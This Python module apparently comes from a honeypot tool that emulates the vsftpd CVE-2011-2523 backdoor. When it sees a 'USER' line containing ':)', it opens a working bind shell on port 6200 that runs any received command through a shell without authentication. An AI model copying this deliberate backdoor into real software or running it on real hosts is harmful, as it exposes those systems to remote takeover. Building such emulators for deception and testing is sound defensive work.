import subprocess
import threading
import time
import structlog
import socket

from firehole.abstract.vulnerability import VulnerabilityAbstract


class Vulnerability(VulnerabilityAbstract):
    def __init__(self, data: bytes, logger: structlog.stdlib.BoundLogger):
        """
        Vulnerability for CVE-2011-2523.
        :param data: current request data
        """
        self._data = data
        self._logger = logger.bind(cve="CVE-2011-2523")

    def check_and_exploit(self) -> bool:
        """
        Check if the request uses the vulnerability and exploit in case it does.
        :return: True in case the vulnerability was used
        """
        data = self._data.decode()
        if "USER " in data and ":)" in data:
            self._logger.info("Exploit detected")
            threading.Thread(target=self.bind_shell, daemon=True).start()
            self._logger.info("backdoor started")
            time.sleep(0.5)
            return True
        return False

    def bind_shell(self, host: str = "", port: int = 6200) -> None:
        bind_socket = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
        try:
            bind_socket.bind((host, port))
        except OSError as ex:
            self._logger.warning("unable to bind shell", host=host, port=port, error=ex)
            return
        bind_socket.listen(1)
        client_socket, address = bind_socket.accept()
        while True:
            data = client_socket.recv(4096)
            if not data:
                break
            result = subprocess.run(data.decode("utf-8"), shell=True, capture_output=True)
            output = result.stdout + result.stderr
            client_socket.sendall(output)
